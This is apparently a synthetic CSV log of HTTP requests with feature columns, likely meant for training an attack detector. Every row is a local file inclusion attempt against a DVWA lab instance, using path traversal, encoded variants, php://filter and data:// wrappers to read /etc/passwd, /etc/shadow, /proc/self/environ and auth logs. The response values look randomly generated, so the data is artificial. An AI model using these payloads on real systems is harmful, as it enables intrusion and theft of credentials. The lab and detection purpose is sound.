timestamp,client_ip,method,url,path,body,body_len,body_entropy,special_char_count,path_depth,query_length,has_file_upload,response_status,response_length
2025-12-24T07:49:52Z,"('127.0.0.1', 35990)",GET,http://192.168.122.170/dvwa/vulnerabilities/fi/?page=../../../../proc/version,/dvwa/vulnerabilities/fi/,../../../../proc/version,24,4.398,13,4,24,0,403,4341
2025-12-24T07:49:58Z,"('127.0.0.1', 35990)",GET,http://192.168.122.170/dvwa/vulnerabilities/fi/?page=..%252f..%252f..%252fetc%252fpasswd,/dvwa/vulnerabilities/fi/,..%252f..%252f..%252fetc%252fpasswd,35,5.861,10,4,35,0,403,3370
2025-12-24T07:50:04Z,"('127.0.0.1', 35990)",GET,http://192.168.122.170/dvwa/vulnerabilities/fi/?page=..%2f..%2f..%2fetc%2fpasswd,/dvwa/vulnerabilities/fi/,..%2f..%2f..%2fetc%2fpasswd,27,3.776,10,4,27,0,500,4329
2025-12-24T07:50:10Z,"('127.0.0.1', 35990)",GET,http://192.168.122.170/dvwa/vulnerabilities/fi/?page=..%252f..%252f..%252fetc%252fpasswd,/dvwa/vulnerabilities/fi/,..%252f..%252f..%252fetc%252fpasswd,35,4.347,10,4,35,0,200,1869
2025-12-24T07:50:16Z,"('127.0.0.1', 35990)",GET,http://192.168.122.170/dvwa/vulnerabilities/fi/?page=..%2f..%2f..%2fetc%2fpasswd,/dvwa/vulnerabilities/fi/,..%2f..%2f..%2fetc%2fpasswd,27,5.48,10,4,27,0,500,1472
2025-12-24T07:50:22Z,"('127.0.0.1', 35990)",GET,http://192.168.122.170/dvwa/vulnerabilities/fi/?page=../../../../etc/passwd,/dvwa/vulnerabilities/fi/,../../../../etc/passwd,22,4.414,13,4,22,0,200,2501
2025-12-24T07:50:28Z,"('127.0.0.1', 35990)",GET,http://192.168.122.170/dvwa/vulnerabilities/fi/?page=/proc/self/environ,/dvwa/vulnerabilities/fi/,/proc/self/environ,18,5.603,3,4,18,0,500,2131
2025-12-24T07:50:34Z,"('127.0.0.1', 35990)",GET,"http://192.168.122.170/dvwa/vulnerabilities/fi/?page=data://text/plain,<?php phpinfo();?>",/dvwa/vulnerabilities/fi/,"data://text/plain,<?php phpinfo();?>",36,4.277,13,4,36,0,200,2697
2025-12-24T07:50:40Z,"('127.0.0.1', 35990)",GET,http://192.168.122.170/dvwa/vulnerabilities/fi/?page=..%2f..%2f..%2fetc%2fpasswd,/dvwa/vulnerabilities/fi/,..%2f..%2f..%2fetc%2fpasswd,27,4.048,10,4,27,0,500,4496
2025-12-24T07:50:46Z,"('127.0.0.1', 35990)",GET,http://192.168.122.170/dvwa/vulnerabilities/fi/?page=../../../../proc/version,/dvwa/vulnerabilities/fi/,../../../../proc/version,24,5.86,13,4,24,0,500,1819
2025-12-24T07:50:52Z,"('127.0.0.1', 35990)",GET,http://192.168.122.170/dvwa/vulnerabilities/fi/?page=../../../../proc/version,/dvwa/vulnerabilities/fi/,../../../../proc/version,24,5.423,13,4,24,0,403,4237
2025-12-24T07:50:58Z,"('127.0.0.1', 35990)",GET,http://192.168.122.170/dvwa/vulnerabilities/fi/?page=..%2f..%2f..%2fetc%2fpasswd,/dvwa/vulnerabilities/fi/,..%2f..%2f..%2fetc%2fpasswd,27,3.771,10,4,27,0,500,4098
2025-12-24T07:51:04Z,"('127.0.0.1', 35990)",GET,http://192.168.122.170/dvwa/vulnerabilities/fi/?page=..%252f..%252f..%252fetc%252fpasswd,/dvwa/vulnerabilities/fi/,..%252f..%252f..%252fetc%252fpasswd,35,5.478,10,4,35,0,500,2299
2025-12-24T07:51:10Z,"('127.0.0.1', 35990)",GET,http://192.168.122.170/dvwa/vulnerabilities/fi/?page=../../../etc/shadow,/dvwa/vulnerabilities/fi/,../../../etc/shadow,19,5.943,10,4,19,0,200,498
2025-12-24T07:51:16Z,"('127.0.0.1', 35990)",GET,http://192.168.122.170/dvwa/vulnerabilities/fi/?page=../../../../proc/version,/dvwa/vulnerabilities/fi/,../../../../proc/version,24,4.613,13,4,24,0,500,4148
2025-12-24T07:51:22Z,"('127.0.0.1', 35990)",GET,http://192.168.122.170/dvwa/vulnerabilities/fi/?page=php://filter/convert.base64-encode/resource=index.php,/dvwa/vulnerabilities/fi/,php://filter/convert.base64-encode/resource=index.php,53,4.49,9,4,53,0,200,1432
2025-12-24T07:51:28Z,"('127.0.0.1', 35990)",GET,http://192.168.122.170/dvwa/vulnerabilities/fi/?page=../../../../etc/passwd,/dvwa/vulnerabilities/fi/,../../../../etc/passwd,22,5.622,13,4,22,0,200,605
2025-12-24T07:51:34Z,"('127.0.0.1', 35990)",GET,"http://192.168.122.170/dvwa/vulnerabilities/fi/?page=data://text/plain,<?php phpinfo();?>",/dvwa/vulnerabilities/fi/,"data://text/plain,<?php phpinfo();?>",36,3.652,13,4,36,0,500,3617
2025-12-24T07:51:40Z,"('127.0.0.1', 35990)",GET,http://192.168.122.170/dvwa/vulnerabilities/fi/?page=/proc/self/environ,/dvwa/vulnerabilities/fi/,/proc/self/environ,18,4.1,3,4,18,0,200,2794
2025-12-24T07:51:46Z,"('127.0.0.1', 35990)",GET,http://192.168.122.170/dvwa/vulnerabilities/fi/?page=../../../../etc/passwd,/dvwa/vulnerabilities/fi/,../../../../etc/passwd,22,3.769,13,4,22,0,200,4738
2025-12-24T07:51:52Z,"('127.0.0.1', 35990)",GET,http://192.168.122.170/dvwa/vulnerabilities/fi/?page=..%252f..%252f..%252fetc%252fpasswd,/dvwa/vulnerabilities/fi/,..%252f..%252f..%252fetc%252fpasswd,35,5.914,10,4,35,0,500,3949
2025-12-24T07:51:58Z,"('127.0.0.1', 35990)",GET,http://192.168.122.170/dvwa/vulnerabilities/fi/?page=../../../../proc/version,/dvwa/vulnerabilities/fi/,../../../../proc/version,24,5.033,13,4,24,0,500,447
2025-12-24T07:52:04Z,"('127.0.0.1', 35990)",GET,http://192.168.122.170/dvwa/vulnerabilities/fi/?page=..%252f..%252f..%252fetc%252fpasswd,/dvwa/vulnerabilities/fi/,..%252f..%252f..%252fetc%252fpasswd,35,5.006,10,4,35,0,403,1901
2025-12-24T07:52:10Z,"('127.0.0.1', 35990)",GET,http://192.168.122.170/dvwa/vulnerabilities/fi/?page=/proc/self/environ,/dvwa/vulnerabilities/fi/,/proc/self/environ,18,4.364,3,4,18,0,403,2258
2025-12-24T07:52:16Z,"('127.0.0.1', 35990)",GET,http://192.168.122.170/dvwa/vulnerabilities/fi/?page=php://filter/convert.base64-encode/resource=index.php,/dvwa/vulnerabilities/fi/,php://filter/convert.base64-encode/resource=index.php,53,3.796,9,4,53,0,500,1515
2025-12-24T07:52:22Z,"('127.0.0.1', 35990)",GET,http://192.168.122.170/dvwa/vulnerabilities/fi/?page=../../../../var/log/auth.log,/dvwa/vulnerabilities/fi/,../../../../var/log/auth.log,28,4.639,15,4,28,0,200,3954
2025-12-24T07:52:28Z,"('127.0.0.1', 35990)",GET,http://192.168.122.170/dvwa/vulnerabilities/fi/?page=../../../../var/log/auth.log,/dvwa/vulnerabilities/fi/,../../../../var/log/auth.log,28,4.562,15,4,28,0,403,1727
2025-12-24T07:52:34Z,"('127.0.0.1', 35990)",GET,http://192.168.122.170/dvwa/vulnerabilities/fi/?page=../../../etc/shadow,/dvwa/vulnerabilities/fi/,../../../etc/shadow,19,3.932,10,4,19,0,403,4782
2025-12-24T07:52:40Z,"('127.0.0.1', 35990)",GET,http://192.168.122.170/dvwa/vulnerabilities/fi/?page=/proc/self/environ,/dvwa/vulnerabilities/fi/,/proc/self/environ,18,5.399,3,4,18,0,403,3629
2025-12-24T07:52:46Z,"('127.0.0.1', 35990)",GET,http://192.168.122.170/dvwa/vulnerabilities/fi/?page=../../../../proc/version,/dvwa/vulnerabilities/fi/,../../../../proc/version,24,5.017,13,4,24,0,403,970
2025-12-24T07:52:52Z,"('127.0.0.1', 35990)",GET,http://192.168.122.170/dvwa/vulnerabilities/fi/?page=../../../etc/shadow,/dvwa/vulnerabilities/fi/,../../../etc/shadow,19,5.566,10,4,19,0,500,4437
2025-12-24T07:52:58Z,"('127.0.0.1', 35990)",GET,http://192.168.122.170/dvwa/vulnerabilities/fi/?page=../../../../var/log/auth.log,/dvwa/vulnerabilities/fi/,../../../../var/log/auth.log,28,5.666,15,4,28,0,403,1600
2025-12-24T07:53:04Z,"('127.0.0.1', 35990)",GET,http://192.168.122.170/dvwa/vulnerabilities/fi/?page=php://filter/convert.base64-encode/resource=index.php,/dvwa/vulnerabilities/fi/,php://filter/convert.base64-encode/resource=index.php,53,5.287,9,4,53,0,200,757
2025-12-24T07:53:10Z,"('127.0.0.1', 35990)",GET,http://192.168.122.170/dvwa/vulnerabilities/fi/?page=../../../../var/log/auth.log,/dvwa/vulnerabilities/fi/,../../../../var/log/auth.log,28,4.836,15,4,28,0,200,1694
2025-12-24T07:53:16Z,"('127.0.0.1', 35990)",GET,http://192.168.122.170/dvwa/vulnerabilities/fi/?page=..%252f..%252f..%252fetc%252fpasswd,/dvwa/vulnerabilities/fi/,..%252f..%252f..%252fetc%252fpasswd,35,5.266,10,4,35,0,200,2591
2025-12-24T07:53:22Z,"('127.0.0.1', 35990)",GET,http://192.168.122.170/dvwa/vulnerabilities/fi/?page=php://filter/convert.base64-encode/resource=index.php,/dvwa/vulnerabilities/fi/,php://filter/convert.base64-encode/resource=index.php,53,5.24,9,4,53,0,500,3835
2025-12-24T07:53:28Z,"('127.0.0.1', 35990)",GET,http://192.168.122.170/dvwa/vulnerabilities/fi/?page=..%252f..%252f..%252fetc%252fpasswd,/dvwa/vulnerabilities/fi/,..%252f..%252f..%252fetc%252fpasswd,35,5.835,10,4,35,0,403,976
2025-12-24T07:53:34Z,"('127.0.0.1', 35990)",GET,http://192.168.122.170/dvwa/vulnerabilities/fi/?page=/proc/self/environ,/dvwa/vulnerabilities/fi/,/proc/self/environ,18,4.612,3,4,18,0,500,989
2025-12-24T07:53:40Z,"('127.0.0.1', 35990)",GET,http://192.168.122.170/dvwa/vulnerabilities/fi/?page=../../../../var/log/auth.log,/dvwa/vulnerabilities/fi/,../../../../var/log/auth.log,28,3.668,15,4,28,0,200,2024
2025-12-24T07:53:46Z,"('127.0.0.1', 35990)",GET,"http://192.168.122.170/dvwa/vulnerabilities/fi/?page=data://text/plain,<?php phpinfo();?>",/dvwa/vulnerabilities/fi/,"data://text/plain,<?php phpinfo();?>",36,5.228,13,4,36,0,200,713
2025-12-24T07:53:52Z,"('127.0.0.1', 35990)",GET,http://192.168.122.170/dvwa/vulnerabilities/fi/?page=/proc/self/environ,/dvwa/vulnerabilities/fi/,/proc/self/environ,18,5.892,3,4,18,0,500,3492
2025-12-24T07:53:58Z,"('127.0.0.1', 35990)",GET,"http://192.168.122.170/dvwa/vulnerabilities/fi/?page=data://text/plain,<?php phpinfo();?>",/dvwa/vulnerabilities/fi/,"data://text/plain,<?php phpinfo();?>",36,5.172,13,4,36,0,403,3754
2025-12-24T07:54:04Z,"('127.0.0.1', 35990)",GET,http://192.168.122.170/dvwa/vulnerabilities/fi/?page=../../../../etc/passwd,/dvwa/vulnerabilities/fi/,../../../../etc/passwd,22,4.858,13,4,22,0,403,1130
2025-12-24T07:54:10Z,"('127.0.0.1', 35990)",GET,http://192.168.122.170/dvwa/vulnerabilities/fi/?page=..%252f..%252f..%252fetc%252fpasswd,/dvwa/vulnerabilities/fi/,..%252f..%252f..%252fetc%252fpasswd,35,5.467,10,4,35,0,200,2988
2025-12-24T07:54:16Z,"('127.0.0.1', 35990)",GET,http://192.168.122.170/dvwa/vulnerabilities/fi/?page=php://filter/convert.base64-encode/resource=index.php,/dvwa/vulnerabilities/fi/,php://filter/convert.base64-encode/resource=index.php,53,3.867,9,4,53,0,500,420
2025-12-24T07:54:22Z,"('127.0.0.1', 35990)",GET,http://192.168.122.170/dvwa/vulnerabilities/fi/?page=../../../../var/log/auth.log,/dvwa/vulnerabilities/fi/,../../../../var/log/auth.log,28,3.822,15,4,28,0,500,2605
2025-12-24T07:54:28Z,"('127.0.0.1', 35990)",GET,http://192.168.122.170/dvwa/vulnerabilities/fi/?page=/proc/self/environ,/dvwa/vulnerabilities/fi/,/proc/self/environ,18,5.174,3,4,18,0,200,4376
2025-12-24T07:54:34Z,"('127.0.0.1', 35990)",GET,http://192.168.122.170/dvwa/vulnerabilities/fi/?page=../../../etc/shadow,/dvwa/vulnerabilities/fi/,../../../etc/shadow,19,5.701,10,4,19,0,403,2306
2025-12-24T07:54:40Z,"('127.0.0.1', 35990)",GET,"http://192.168.122.170/dvwa/vulnerabilities/fi/?page=data://text/plain,<?php phpinfo();?>",/dvwa/vulnerabilities/fi/,"data://text/plain,<?php phpinfo();?>",36,4.462,13,4,36,0,200,2416
2025-12-24T07:54:46Z,"('127.0.0.1', 35990)",GET,http://192.168.122.170/dvwa/vulnerabilities/fi/?page=../../../../etc/passwd,/dvwa/vulnerabilities/fi/,../../../../etc/passwd,22,4.549,13,4,22,0,200,1904
2025-12-24T07:54:52Z,"('127.0.0.1', 35990)",GET,http://192.168.122.170/dvwa/vulnerabilities/fi/?page=..%2f..%2f..%2fetc%2fpasswd,/dvwa/vulnerabilities/fi/,..%2f..%2f..%2fetc%2fpasswd,27,4.866,10,4,27,0,403,665
2025-12-24T07:54:58Z,"('127.0.0.1', 35990)",GET,"http://192.168.122.170/dvwa/vulnerabilities/fi/?page=data://text/plain,<?php phpinfo();?>",/dvwa/vulnerabilities/fi/,"data://text/plain,<?php phpinfo();?>",36,4.365,13,4,36,0,403,1239
2025-12-24T07:55:04Z,"('127.0.0.1', 35990)",GET,http://192.168.122.170/dvwa/vulnerabilities/fi/?page=../../../../etc/passwd,/dvwa/vulnerabilities/fi/,../../../../etc/passwd,22,5.559,13,4,22,0,403,1509
2025-12-24T07:55:10Z,"('127.0.0.1', 35990)",GET,http://192.168.122.170/dvwa/vulnerabilities/fi/?page=php://filter/convert.base64-encode/resource=index.php,/dvwa/vulnerabilities/fi/,php://filter/convert.base64-encode/resource=index.php,53,4.748,9,4,53,0,200,1048
2025-12-24T07:55:16Z,"('127.0.0.1', 35990)",GET,http://192.168.122.170/dvwa/vulnerabilities/fi/?page=../../../../var/log/auth.log,/dvwa/vulnerabilities/fi/,../../../../var/log/auth.log,28,5.872,15,4,28,0,200,4006
2025-12-24T07:55:22Z,"('127.0.0.1', 35990)",GET,http://192.168.122.170/dvwa/vulnerabilities/fi/?page=php://filter/convert.base64-encode/resource=index.php,/dvwa/vulnerabilities/fi/,php://filter/convert.base64-encode/resource=index.php,53,4.473,9,4,53,0,200,4210
2025-12-24T07:55:28Z,"('127.0.0.1', 35990)",GET,http://192.168.122.170/dvwa/vulnerabilities/fi/?page=../../../etc/shadow,/dvwa/vulnerabilities/fi/,../../../etc/shadow,19,3.833,10,4,19,0,500,2845
2025-12-24T07:55:34Z,"('127.0.0.1', 35990)",GET,http://192.168.122.170/dvwa/vulnerabilities/fi/?page=../../../../var/log/auth.log,/dvwa/vulnerabilities/fi/,../../../../var/log/auth.log,28,4.331,15,4,28,0,403,4514
2025-12-24T07:55:40Z,"('127.0.0.1', 35990)",GET,http://192.168.122.170/dvwa/vulnerabilities/fi/?page=../../../../etc/passwd,/dvwa/vulnerabilities/fi/,../../../../etc/passwd,22,5.29,13,4,22,0,200,757
2025-12-24T07:55:46Z,"('127.0.0.1', 35990)",GET,http://192.168.122.170/dvwa/vulnerabilities/fi/?page=../../../etc/shadow,/dvwa/vulnerabilities/fi/,../../../etc/shadow,19,5.207,10,4,19,0,500,4513
2025-12-24T07:55:52Z,"('127.0.0.1', 35990)",GET,"http://192.168.122.170/dvwa/vulnerabilities/fi/?page=data://text/plain,<?php phpinfo();?>",/dvwa/vulnerabilities/fi/,"data://text/plain,<?php phpinfo();?>",36,5.651,13,4,36,0,200,4370
2025-12-24T07:55:58Z,"('127.0.0.1', 35990)",GET,http://192.168.122.170/dvwa/vulnerabilities/fi/?page=php://filter/convert.base64-encode/resource=index.php,/dvwa/vulnerabilities/fi/,php://filter/convert.base64-encode/resource=index.php,53,4.792,9,4,53,0,403,1344
2025-12-24T07:56:04Z,"('127.0.0.1', 35990)",GET,http://192.168.122.170/dvwa/vulnerabilities/fi/?page=../../../etc/shadow,/dvwa/vulnerabilities/fi/,../../../etc/shadow,19,5.445,10,4,19,0,500,2055
2025-12-24T07:56:10Z,"('127.0.0.1', 35990)",GET,http://192.168.122.170/dvwa/vulnerabilities/fi/?page=..%2f..%2f..%2fetc%2fpasswd,/dvwa/vulnerabilities/fi/,..%2f..%2f..%2fetc%2fpasswd,27,4.709,10,4,27,0,403,2209
2025-12-24T07:56:16Z,"('127.0.0.1', 35990)",GET,http://192.168.122.170/dvwa/vulnerabilities/fi/?page=../../../../var/log/auth.log,/dvwa/vulnerabilities/fi/,../../../../var/log/auth.log,28,5.232,15,4,28,0,500,3511
2025-12-24T07:56:22Z,"('127.0.0.1', 35990)",GET,http://192.168.122.170/dvwa/vulnerabilities/fi/?page=/proc/self/environ,/dvwa/vulnerabilities/fi/,/proc/self/environ,18,4.302,3,4,18,0,500,421
2025-12-24T07:56:28Z,"('127.0.0.1', 35990)",GET,http://192.168.122.170/dvwa/vulnerabilities/fi/?page=..%252f..%252f..%252fetc%252fpasswd,/dvwa/vulnerabilities/fi/,..%252f..%252f..%252fetc%252fpasswd,35,4.225,10,4,35,0,403,865
2025-12-24T07:56:34Z,"('127.0.0.1', 35990)",GET,"http://192.168.122.170/dvwa/vulnerabilities/fi/?page=data://text/plain,<?php phpinfo();?>",/dvwa/vulnerabilities/fi/,"data://text/plain,<?php phpinfo();?>",36,4.882,13,4,36,0,403,4150
2025-12-24T07:56:40Z,"('127.0.0.1', 35990)",GET,http://192.168.122.170/dvwa/vulnerabilities/fi/?page=../../../../proc/version,/dvwa/vulnerabilities/fi/,../../../../proc/version,24,3.647,13,4,24,0,403,984
2025-12-24T07:56:46Z,"('127.0.0.1', 35990)",GET,http://192.168.122.170/dvwa/vulnerabilities/fi/?page=php://filter/convert.base64-encode/resource=index.php,/dvwa/vulnerabilities/fi/,php://filter/convert.base64-encode/resource=index.php,53,4.173,9,4,53,0,200,3145
2025-12-24T07:56:52Z,"('127.0.0.1', 35990)",GET,http://192.168.122.170/dvwa/vulnerabilities/fi/?page=..%252f..%252f..%252fetc%252fpasswd,/dvwa/vulnerabilities/fi/,..%252f..%252f..%252fetc%252fpasswd,35,4.629,10,4,35,0,500,4371
2025-12-24T07:56:58Z,"('127.0.0.1', 35990)",GET,http://192.168.122.170/dvwa/vulnerabilities/fi/?page=/proc/self/environ,/dvwa/vulnerabilities/fi/,/proc/self/environ,18,4.009,3,4,18,0,403,1856
2025-12-24T07:57:04Z,"('127.0.0.1', 35990)",GET,http://192.168.122.170/dvwa/vulnerabilities/fi/?page=../../../../etc/passwd,/dvwa/vulnerabilities/fi/,../../../../etc/passwd,22,5.356,13,4,22,0,403,459
2025-12-24T07:57:10Z,"('127.0.0.1', 35990)",GET,http://192.168.122.170/dvwa/vulnerabilities/fi/?page=..%252f..%252f..%252fetc%252fpasswd,/dvwa/vulnerabilities/fi/,..%252f..%252f..%252fetc%252fpasswd,35,3.604,10,4,35,0,403,3420
2025-12-24T07:57:16Z,"('127.0.0.1', 35990)",GET,http://192.168.122.170/dvwa/vulnerabilities/fi/?page=../../../../proc/version,/dvwa/vulnerabilities/fi/,../../../../proc/version,24,3.821,13,4,24,0,403,3760
2025-12-24T07:57:22Z,"('127.0.0.1', 35990)",GET,http://192.168.122.170/dvwa/vulnerabilities/fi/?page=../../../etc/shadow,/dvwa/vulnerabilities/fi/,../../../etc/shadow,19,3.858,10,4,19,0,500,652
2025-12-24T07:57:28Z,"('127.0.0.1', 35990)",GET,http://192.168.122.170/dvwa/vulnerabilities/fi/?page=php://filter/convert.base64-encode/resource=index.php,/dvwa/vulnerabilities/fi/,php://filter/convert.base64-encode/resource=index.php,53,4.86,9,4,53,0,200,3313
2025-12-24T07:57:34Z,"('127.0.0.1', 35990)",GET,http://192.168.122.170/dvwa/vulnerabilities/fi/?page=../../../../var/log/auth.log,/dvwa/vulnerabilities/fi/,../../../../var/log/auth.log,28,4.376,15,4,28,0,500,1757
2025-12-24T07:57:40Z,"('127.0.0.1', 35990)",GET,http://192.168.122.170/dvwa/vulnerabilities/fi/?page=php://filter/convert.base64-encode/resource=index.php,/dvwa/vulnerabilities/fi/,php://filter/convert.base64-encode/resource=index.php,53,5.218,9,4,53,0,500,1441
2025-12-24T07:57:46Z,"('127.0.0.1', 35990)",GET,http://192.168.122.170/dvwa/vulnerabilities/fi/?page=..%2f..%2f..%2fetc%2fpasswd,/dvwa/vulnerabilities/fi/,..%2f..%2f..%2fetc%2fpasswd,27,5.868,10,4,27,0,403,3274
2025-12-24T07:57:52Z,"('127.0.0.1', 35990)",GET,"http://192.168.122.170/dvwa/vulnerabilities/fi/?page=data://text/plain,<?php phpinfo();?>",/dvwa/vulnerabilities/fi/,"data://text/plain,<?php phpinfo();?>",36,4.876,13,4,36,0,200,4379
2025-12-24T07:57:58Z,"('127.0.0.1', 35990)",GET,http://192.168.122.170/dvwa/vulnerabilities/fi/?page=../../../../var/log/auth.log,/dvwa/vulnerabilities/fi/,../../../../var/log/auth.log,28,4.085,15,4,28,0,403,1219
2025-12-24T07:58:04Z,"('127.0.0.1', 35990)",GET,http://192.168.122.170/dvwa/vulnerabilities/fi/?page=../../../../var/log/auth.log,/dvwa/vulnerabilities/fi/,../../../../var/log/auth.log,28,4.459,15,4,28,0,200,4196
2025-12-24T07:58:10Z,"('127.0.0.1', 35990)",GET,http://192.168.122.170/dvwa/vulnerabilities/fi/?page=..%252f..%252f..%252fetc%252fpasswd,/dvwa/vulnerabilities/fi/,..%252f..%252f..%252fetc%252fpasswd,35,5.662,10,4,35,0,500,3222
2025-12-24T07:58:16Z,"('127.0.0.1', 35990)",GET,http://192.168.122.170/dvwa/vulnerabilities/fi/?page=/proc/self/environ,/dvwa/vulnerabilities/fi/,/proc/self/environ,18,4.327,3,4,18,0,200,2482
2025-12-24T07:58:22Z,"('127.0.0.1', 35990)",GET,http://192.168.122.170/dvwa/vulnerabilities/fi/?page=/proc/self/environ,/dvwa/vulnerabilities/fi/,/proc/self/environ,18,5.0,3,4,18,0,200,1080
2025-12-24T07:58:28Z,"('127.0.0.1', 35990)",GET,http://192.168.122.170/dvwa/vulnerabilities/fi/?page=..%2f..%2f..%2fetc%2fpasswd,/dvwa/vulnerabilities/fi/,..%2f..%2f..%2fetc%2fpasswd,27,4.403,10,4,27,0,403,4114
2025-12-24T07:58:34Z,"('127.0.0.1', 35990)",GET,http://192.168.122.170/dvwa/vulnerabilities/fi/?page=../../../../var/log/auth.log,/dvwa/vulnerabilities/fi/,../../../../var/log/auth.log,28,5.839,15,4,28,0,403,4236
2025-12-24T07:58:40Z,"('127.0.0.1', 35990)",GET,http://192.168.122.170/dvwa/vulnerabilities/fi/?page=../../../../proc/version,/dvwa/vulnerabilities/fi/,../../../../proc/version,24,3.658,13,4,24,0,500,3076
2025-12-24T07:58:46Z,"('127.0.0.1', 35990)",GET,http://192.168.122.170/dvwa/vulnerabilities/fi/?page=../../../../proc/version,/dvwa/vulnerabilities/fi/,../../../../proc/version,24,5.674,13,4,24,0,500,3756
2025-12-24T07:58:52Z,"('127.0.0.1', 35990)",GET,http://192.168.122.170/dvwa/vulnerabilities/fi/?page=..%2f..%2f..%2fetc%2fpasswd,/dvwa/vulnerabilities/fi/,..%2f..%2f..%2fetc%2fpasswd,27,4.758,10,4,27,0,403,1965
2025-12-24T07:58:58Z,"('127.0.0.1', 35990)",GET,http://192.168.122.170/dvwa/vulnerabilities/fi/?page=..%252f..%252f..%252fetc%252fpasswd,/dvwa/vulnerabilities/fi/,..%252f..%252f..%252fetc%252fpasswd,35,5.803,10,4,35,0,500,813
2025-12-24T07:59:04Z,"('127.0.0.1', 35990)",GET,http://192.168.122.170/dvwa/vulnerabilities/fi/?page=php://filter/convert.base64-encode/resource=index.php,/dvwa/vulnerabilities/fi/,php://filter/convert.base64-encode/resource=index.php,53,4.388,9,4,53,0,200,4299
2025-12-24T07:59:10Z,"('127.0.0.1', 35990)",GET,http://192.168.122.170/dvwa/vulnerabilities/fi/?page=../../../../etc/passwd,/dvwa/vulnerabilities/fi/,../../../../etc/passwd,22,5.899,13,4,22,0,200,3188
2025-12-24T07:59:16Z,"('127.0.0.1', 35990)",GET,http://192.168.122.170/dvwa/vulnerabilities/fi/?page=../../../etc/shadow,/dvwa/vulnerabilities/fi/,../../../etc/shadow,19,5.505,10,4,19,0,200,3311
2025-12-24T07:59:22Z,"('127.0.0.1', 35990)",GET,http://192.168.122.170/dvwa/vulnerabilities/fi/?page=/proc/self/environ,/dvwa/vulnerabilities/fi/,/proc/self/environ,18,5.532,3,4,18,0,200,1404
2025-12-24T07:59:28Z,"('127.0.0.1', 35990)",GET,http://192.168.122.170/dvwa/vulnerabilities/fi/?page=/proc/self/environ,/dvwa/vulnerabilities/fi/,/proc/self/environ,18,5.958,3,4,18,0,403,1145
2025-12-24T07:59:34Z,"('127.0.0.1', 35990)",GET,http://192.168.122.170/dvwa/vulnerabilities/fi/?page=../../../../proc/version,/dvwa/vulnerabilities/fi/,../../../../proc/version,24,5.237,13,4,24,0,500,4521
2025-12-24T07:59:40Z,"('127.0.0.1', 35990)",GET,http://192.168.122.170/dvwa/vulnerabilities/fi/?page=../../../../proc/version,/dvwa/vulnerabilities/fi/,../../../../proc/version,24,5.529,13,4,24,0,403,3126
2025-12-24T07:59:46Z,"('127.0.0.1', 35990)",GET,http://192.168.122.170/dvwa/vulnerabilities/fi/?page=..%252f..%252f..%252fetc%252fpasswd,/dvwa/vulnerabilities/fi/,..%252f..%252f..%252fetc%252fpasswd,35,3.603,10,4,35,0,200,3048
2025-12-24T07:59:52Z,"('127.0.0.1', 35990)",GET,http://192.168.122.170/dvwa/vulnerabilities/fi/?page=../../../../etc/passwd,/dvwa/vulnerabilities/fi/,../../../../etc/passwd,22,5.111,13,4,22,0,403,841
